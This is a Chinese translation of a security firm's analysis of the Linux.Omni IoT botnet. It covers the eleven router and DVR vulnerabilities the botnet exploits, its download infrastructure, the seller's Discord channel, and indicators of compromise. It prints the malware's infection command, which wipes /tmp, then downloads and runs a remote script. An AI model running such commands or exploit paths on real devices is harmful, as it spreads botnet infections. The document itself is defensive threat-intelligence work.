## 写在前面的话

**本文将研究最近在我们的蜜罐中检测到的恶意软件Linux.Omni僵尸网络。为什么这个僵尸网络引起我们的注意，因为它的感染库中包含了许多漏洞(总共11个不同的漏洞)，最终能够确定它是IoTReaper的一个新版本。**

## 分析

![Linux.Omni
IoT恶意软件分析](https://image.3001.net/images/20181216/1544975339_5c1673eba6c5e.png!small)首先，让我们感到惊讶的第一件事就是该恶意软件的分类，也就是OMNI。近几周来，我们检测到了OWARI、TOKYO、SORA、ECCHI等等，所有这些恶意软件都是Gafgyt和Mirai的分支版本。并且，所有这些恶意软件与之前的分析结果相比，没有任何创新。因此，分析该恶意软件的感染方式，我们发现如下说明：  
![Linux.Omni
IoT恶意软件分析](https://image.3001.net/images/20181216/1544975347_5c1673f31aadc.png!small)正如您所看到的，它是一个相当标准的脚本，是从另一个僵尸网络感染，没有什么新东西。尽管当前，一切证据都表明这个样本是Mirai或Gafgyt的一个常见变种，但我们还是对样本进行了下载和分析。我们最开始发现二进制文件是用UPX进行加壳的，这在大多数同类型样本中不是很常见，但在其他一些流行的僵尸网络变种中却并不罕见。然后我们发现二进制的基本结构与Mirai相对应。但是，我们在分析二进制文件中的感染选项时，发现其攻击方式存在不同。除了使用默认凭据进行传播之外，它还利用了已经在IoTReaper、Okiru、Satori等其他僵尸网络中发现的IoT设备漏洞，包括近期发现的影响GPON路由器的漏洞。  
![Linux.Omni
IoT恶意软件分析](https://image.3001.net/images/20181216/1544975363_5c167403cb168.png!small)

### Vacron

在`“board.cgi”`中，使用了VACRON网络视频录像机中代码注入的漏洞，该参数在HTTP请求解析中，并没有得到较好的调试。我们曾发现IoTReaper僵尸网络利用了这一漏洞。  
![4.png](https://image.3001.net/images/20181216/1544975371_5c16740b58f3a.png!small)

### Netgear – CVE-2016-6277

我们在Omni中发现的另一个漏洞是CVE-2016-6277，该漏洞是通过对受影响路由器的`cgi-bin/`目录进行GET请求实现，最终导致远程代码执行。该漏洞影响Netgear如下型号的路由器：R6400、R7000、R7000P、R7500、R7800、R8000、R8500、R9000。  
![5.png](https://image.3001.net/images/20181216/1544975379_5c1674136f972.png!small)

### D-Link - **通过UPnP命令注入**

与IoTReaper一样，Omni也利用了D-Link路由器的命令。僵尸网络利用了`hedwig.cgi`中存在的Cookie溢出漏洞，并通过UPnP接口实现命令注入。请求如下：

![6.png](https://image.3001.net/images/20181216/1544975386_5c16741a74052.png!small)我们可以在二进制中找到它:  
![7.png](https://image.3001.net/images/20181216/1544975395_5c16742338699.png!small)受漏洞影响的固件版本如下：DIR-300
rev B – 2.14b01,DIR-600 – 2.16b01,DIR-645 – 1.04b01,DIR-845 – 1.01b02,DIR-865
– 1.05b03

### CCTV-DVR

恶意软件中发现的另一个漏洞影响了70多家不同的制造商，并与允许远程代码执行的`“/language/Swedish”`资源相关联。  
![8.png](https://image.3001.net/images/20181216/1544975402_5c16742aa6f3a.png!small)可以在这里找到受该漏洞影响的设备[列表](a%20href=)

### D-Link – HNAP

该漏洞在2014年被发现，允许绕过CAPTCHA登录认证，同时允许外部攻击者执行远程代码。该漏洞被恶意软件The Moon使用。  
![9.png](https://image.3001.net/images/20181216/1544975409_5c16743175b56.png!small)该漏洞影响如下固件版本的D-Link路由器：DI-524 C1 3.23,DIR-628 B2 1.20NA 1.22NA,DIR-655 A1 1.30EA

### TR-069 – SOAP

该漏洞在2016年11月，被Mirai僵尸网络利用，最终导致德国电信被攻陷。  
![10.png](https://image.3001.net/images/20181216/1544975477_5c16747570d2d.png!small)二进制文件中相应部分如下：  
![11.png](https://image.3001.net/images/20181216/1544975484_5c16747cc0b17.png!small)

### 华为HG532路由器 – 任意命令执行

华为HG532路由器在配置文件验证错误时检测到漏洞，可以通过修改HTTP请求来利用该漏洞。  
![12.png](https://image.3001.net/images/20181216/1544975491_5c167483cea8e.png!small)目前已经发现，Okiru、Satori恶意软件利用了这一漏洞，并且我们已经在此前的[文章](a%20href=)进行了分析。

### Netgear – Setup.cgi远程代码执行

该漏洞影响Netgear路由器DGN1000 1.1.00.48固件版本，在未经验证的情况下，允许远程执行代码  
![13.png](https://image.3001.net/images/20181216/1544975499_5c16748b5d9a1.png!small)

### Realtek SDK

多个设备使用了带有miniigd守护程序的Realtel SDK，这些守护程序存在通过UPnP
SOAP接口实现的命令注入漏洞。该漏洞与上面提到的华为路由器漏洞一样，已经发现被Okiru、Satori恶意软件利用。  
![14.png](https://image.3001.net/images/20181216/1544975507_5c16749355a09.png!small)

### GPON

最后，我们在上个月发现了最新的漏洞，它影响GPON路由器，并且已经被合并到影响Linux服务器的IoT僵尸网络和挖掘器中。  
![15.png](https://image.3001.net/images/20181216/1544975514_5c16749a6b3ed.png!small)此外，僵尸网络也通过默认凭证的方式实现扩散，这些凭证使用了与0x33不同的密钥进行XOR编码（0x33是该恶意软件家族通常使用的密钥），其中每个组合都使用不同的密钥。

## 基础设施分析

尽管攻击载体多种多样，但在设备上执行的命令是相同的:`cd /tmp;rm -rf *;wget
<http://%s/>{marcaDispositivo};sh
/tmp/{marcaDispositivo}`其下载的文件是bash脚本，该脚本会根据受感染设备的体系结构来下载不同的样本。  
![16.png](https://image.3001.net/images/20181216/1544975521_5c1674a1d505e.png!small)我们可以看到,这种利用不符合分析样本,但只是致力于设备的搜索潜在的脆弱的HTTP接口,以及漏洞检查默认凭据,因此获得两种类型的感染,感染途径共有两种，一种是使用前面提到的11个漏洞，另一种是针对公开HTTP服务的潜在目标尝试默认凭据登录。因此，该体系结构与之前我们发现IoTReaper僵尸网络的体系结构非常相似。

## 最后

通过对二进制文件的深入调查，我们找到了IP地址213.183.53 [.]
120，该IP地址作为样本的下载服务器。尽管没有找到可用的目录列表，但我们在根目录中找到了一个“Discord”平台，该平台通常是游戏玩家观众的文字和语音聊天工具。![17.png](https://image.3001.net/images/20181216/1544975528_5c1674a899610.png!small)由于该平台不需要任何权限或邀请就能进入，我们使用了megahacker名称，进入聊天。  
![18.png](https://image.3001.net/images/20181216/1544975534_5c1674aeec86b.png!small)我们发现聊天的主题不是电子游戏，而是一个出售僵尸网络服务的平台。  
![19.png](https://image.3001.net/images/20181216/1544975542_5c1674b67f3d4.png!small)在房间里呆了几分钟后，可以推断出基础设施背后的人是用户Scarface，并且，他为他的僵尸网络制作了一些非常酷的广告海报。  
![20.png](https://image.3001.net/images/20181216/1544975549_5c1674bded8b7.png!small)此外，它还提供僵尸网络的用户支持服务，并且接受消费者提出的需求。  
![21.png](https://image.3001.net/images/20181216/1544975557_5c1674c508dd6.png!small)我们发现，网络犯罪分子非常不专业，Scarface多次展示其使用僵尸网络获得的“成绩”，其中的一些数字非常荒谬。此外，该网络犯罪分子极其警惕，担心每一位进入该聊天室的人都有可能是警察。  
![22.png](https://image.3001.net/images/20181216/1544975567_5c1674cfa86c4.png!small)![23.png](https://image.3001.net/images/20181216/1544975579_5c1674db6d1af.png!small)最终，我们确定了Linux.Omni恶意软件实际上就是IoTReaper恶意软件的更新版本，二者使用了相同的网络架构格式，并且Linux.Omni使用了Mirai的源代码。附件是用于检测Linux的Yara规则。Omni恶意软件:  
![24.png](https://image.3001.net/images/20181216/1544975586_5c1674e20091d.png!small)

### IoC

    
    
    213.183.53[.]120
    21aa9c42b42e95c98e52157fd63f36c289c29a7b7a3824f4f70486236a2985ff
    4cf7e64c3b9c1ad5fa57d0d0bbdeb930defcdf737fda9639955be1e78b06ded6
    6dfd411f2558e533728bfb04dd013049dd765d61e3c774788e3beca404e0fd73
    000b018848e7fd947e87f1d3b8432faccb3418e0029bde7db8abf82c552bbc63
    5ad981aefed712909294af47bce51be12524f4b547a63d7faaa40d3260e73235
    31a2779c91846e37ad88e9803cbad8f8931e3229e88037f1d27437141ecbd164
    528344fd220eff87b7494ca94caed6eae7886d8003ad37154fdb7048029e880b
    cfca058a4d0a29b3da285a5df21b14c360fb3291dff3c941659fe27f3738ba3e
    2b32375864d0849e676536b916465a1fbb754bbdf783421948023467d364fb4c
    700c9b51e6f8750a20fcc7019207112690974dcda687a83626716d8233923c17
    feb362167c9251dd877a0d76d3b42b68fcd334181946523ca808382852f48b7d
    ca6bc4e4c490999f97ee3fd1db41373fc0ba114dce2e88c538998d19a6f694da
    fc4cfc6300e3122ef9bbe6da3634d3b9839e833e4fc2cea8f1498623398af015
    0fd93aeb2af3541daa152d9aff8388c89211b99d46ead1220c539fa178543bca
    02a61e1d80b1f25d161de8821a31cd710987772668ce62c8be6d9afabe932712
    377a49403cef46902e77ff323fcc9a8f74ea041743ccdbff41de3c063367c99a
    812aa39075027b21671e5a628513378c598aef0feb57d0f5d837375c73ade8e8
    c9caccd707504634185ee2a94302e3964fb6747963e7020dffa34de85bd4d2ce
    a159c7b5d2c38071eb11f5e28b26f7d8beaf6f0f19a8c704687f26bfa9958d78
    5eb7801551ee15baec5ef06b0265d0d0cc8488f16763517344bb8456a2831b82
    2f1d0794d24b7b4f164ebce5bdde6fccd57cdbf91ea90ec2f628caf7fd991ce4
    (N.d.E.: Original post in Spanish)
    

***参考来源[securityartwork](https://www.securityartwork.es/2018/11/08/analysis-of-linux-omni/)，由周大涛编译，转载请注明来自FreeBuf.COM **  

